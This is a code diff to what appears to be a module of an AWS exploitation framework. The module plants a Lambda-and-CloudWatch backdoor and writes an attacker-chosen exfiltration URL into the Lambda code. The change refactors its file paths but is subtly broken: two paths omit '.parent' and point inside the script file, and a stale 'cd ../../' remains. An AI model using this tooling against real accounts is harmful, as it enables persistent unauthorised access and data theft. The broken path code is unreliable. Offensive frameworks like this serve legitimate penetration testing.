@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import argparse
+from pathlib import Path
+
 from botocore.exceptions import ClientError
 from copy import deepcopy
 import subprocess
@@ -48,11 +50,11 @@ def main(args, pacu_main):
         created_lambda_functions = []
         created_cwe_rules = []
 
-        if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
-            with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
+        if os.path.isfile(Path(__file__).parent/'created-lambda-functions.txt'):
+            with open(Path(__file__).parent/'created-lambda-functions.txt', 'r') as f:
                 created_lambda_functions = f.readlines()
-        if os.path.isfile('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name'])):
-            with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'r') as f:
+        if os.path.isfile(Path(__file__).parent/'created-cloudwatch-events-rules.txt'):
+            with open(Path(__file__).parent/'created-cloudwatch-events-rules.txt', 'r') as f:
                 created_cwe_rules = f.readlines()
 
         if created_lambda_functions:
@@ -75,9 +77,9 @@ def main(args, pacu_main):
                     break
             if delete_function_file:
                 try:
-                    os.remove('./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
+                    os.remove(Path(__file__).parent/'created-lambda-functions.txt')
                 except Exception as error:
-                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
+                    print(f"  Failed to remove {Path(__file__).parent/'created-lambda-functions.txt'}")
                     print('    {}: {}'.format(type(error), error))
 
         if created_cwe_rules:
@@ -104,9 +106,9 @@ def main(args, pacu_main):
                     break
             if delete_cwe_file:
                 try:
-                    os.remove('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
+                    os.remove(Path(__file__)/'created-cloudwatch-events-rules.txt')
                 except Exception as error:
-                    print('  Failed to remove ./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
+                    print(f"  Failed to remove {Path(__file__)/'created-cloudwatch-events-rules.txt'}")
                     print('    {}: {}'.format(type(error), error))
 
         print('Completed cleanup mode.\n')
@@ -134,23 +136,24 @@ def main(args, pacu_main):
         target_role_arn = roles[int(choice)]['Arn']
 
     # Import the Lambda function and modify the variables it needs
-    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
+    with open(Path(__file__).parent/'lambda_function.py.bak', 'r') as f:
         code = f.read()
 
     code = code.replace('POST_URL', args.exfil_url)
 
-    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
+    with open(Path(__file__).parent/'lambda_function.py', 'w+') as f:
         f.write(code)
 
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
-        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(module_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(f"cd {Path(__file__).parent} && rm -f lambda_function.zip && zip lambda_function.zip "
+                       f"lambda_function.py && cd ../../", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
 
-    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
+    with open(Path(__file__).parent/'lambda_function.zip', 'rb') as f:
         zip_file_bytes = f.read()
 
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
@@ -217,10 +220,10 @@ def main(args, pacu_main):
             print(code)
 
     if created_resources['LambdaFunctions']:
-        with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
+        with open(Path(__file__).parent/'created-lambda-functions.txt', 'w+') as f:
             f.write('\n'.join(created_resources['LambdaFunctions']))
     if created_resources['CWERules']:
-        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
+        with open(Path(__file__)/'created-cloudwatch-events-rules.txt', 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
     print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
